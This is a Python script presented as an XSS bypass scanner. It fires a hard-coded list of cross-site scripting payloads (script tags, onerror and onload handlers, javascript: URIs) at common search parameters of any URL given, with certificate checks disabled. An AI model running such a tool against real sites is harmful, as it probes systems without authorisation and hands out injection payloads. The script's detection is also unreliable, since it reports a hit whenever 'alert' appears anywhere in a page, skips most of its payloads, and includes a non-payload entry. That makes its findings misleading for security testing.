#!/usr/bin/env python3
"""
XSS Bypass Scanner
Tests XSS filter bypasses
"""

import requests
import argparse
import warnings
warnings.filterwarnings('ignore')

BYPASS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg/onload=alert(1)>',
    '<body onload=alert(1)>',
    '<iframe src=javascript:alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<keygen onfocus=alert(1) autofocus>',
    '<video><source onerror="alert(1)">',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<math>',
    '<a href="javascript:alert(1)">',
    '<base href="javascript:alert(1)//">',
    '<object data="javascript:alert(1)">',
    '<embed src="javascript:alert(1)">',
]

def scan(target):
    print(f"[*] XSS Bypass Scanner - {target}")
    print("="*50)
    
    if not target.startswith(('http://', 'https://')):
        target = 'https://' + target
    
    found = []
    params = ['q', 'search', 'query', 's', 'keyword']
    
    for param in params:
        for payload in BYPASS_PAYLOADS[:8]:
            try:
                r = requests.get(target, params={param: payload}, timeout=10, verify=False)
                if 'alert' in r.text.lower() or payload in r.text:
                    print(f"[!] XSS: {param}")
                    found.append(param)
            except:
                pass
    
    print("\n" + "="*50)
    print(f"[*] Found {len(found)} XSS vectors")
    return found

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='XSS Bypass')
    parser.add_argument('target', help='Target URL')
    args = parser.parse_args()
    scan(args.target)